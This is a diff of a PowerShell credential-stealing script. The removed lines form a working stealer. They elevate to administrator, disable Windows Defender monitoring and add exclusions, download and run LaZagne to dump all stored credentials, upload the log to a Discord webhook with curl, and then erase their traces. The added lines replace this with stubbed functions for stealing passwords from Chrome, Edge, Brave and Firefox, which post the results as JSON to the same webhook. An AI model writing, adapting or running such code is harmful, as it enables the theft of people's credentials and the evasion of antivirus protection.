@@ -1,36 +1,50 @@
-$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-$windowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
-$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
-$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
-$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-$dir = "$env:temp\JHknfuiD"
-if (!(Test-Path -Path "$dir")) {
-New-Item -ItemType Directory -Path "$dir"
-}
-if (-not $windowsPrincipal.IsInRole($adminRole)) {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } | Out-String
-    $arguments = $arguments.Trim()
-    Start-Process powershell.exe -Verb runAs -ArgumentList "-File `"$scriptPath`" $arguments"
-    exit
+$webhookUrl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
+
+# Function to extract Chrome passwords
+function Get-ChromePasswords {
+    # Your code to extract Chrome passwords
+    # This will depend on the structure of the Chrome password storage and decryption method
+    # For example, you may need to read from the SQLite database and decrypt passwords using DPAPI
+    # Return the extracted passwords
 }
 
-if ($Admin -eq 'True') {
-  Set-MpPreference -DisableRealtimeMonitoring $true
-
-  Add-MpPreference -ExclusionPath "$dir"
-  Add-MpPreference -ExclusionPath "C:\"
+# Function to extract Edge passwords
+function Get-EdgePasswords {
+    # Your code to extract Edge passwords
+    # This will depend on the structure of the Edge password storage and decryption method
+    # Return the extracted passwords
 }
-$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-$verm = "v$version"
-$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
-$hide = Get-Item "$dir" -Force
-$hide.attributes='Hidden'
-Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
-& "$dir\lazagne.exe" all -vv > "$log"
-curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
-Start-Sleep -Seconds 20
-$unhide = Get-Item "$dir" -Force
-$unhide.attributes='Normal'
-Remove-Item -Path "$dir" -Recurse -Force
+
+# Function to extract Brave passwords
+function Get-BravePasswords {
+    # Your code to extract Brave passwords
+    # This will depend on the structure of the Brave password storage and decryption method
+    # Return the extracted passwords
+}
+
+# Function to extract Firefox passwords
+function Get-FirefoxPasswords {
+    # Your code to extract Firefox passwords
+    # This will depend on the structure of the Firefox password storage and decryption method
+    # Return the extracted passwords
+}
+
+# Collect passwords from all browsers
+$chromePasswords = Get-ChromePasswords
+$edgePasswords = Get-EdgePasswords
+$bravePasswords = Get-BravePasswords
+$firefoxPasswords = Get-FirefoxPasswords
+
+# Combine all passwords into a single object
+$passwords = @{
+    Chrome = $chromePasswords
+    Edge = $edgePasswords
+    Brave = $bravePasswords
+    Firefox = $firefoxPasswords
+}
+
+# Convert the passwords to JSON
+$json = $passwords | ConvertTo-Json
+
+# Send the passwords to the webhook
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json"
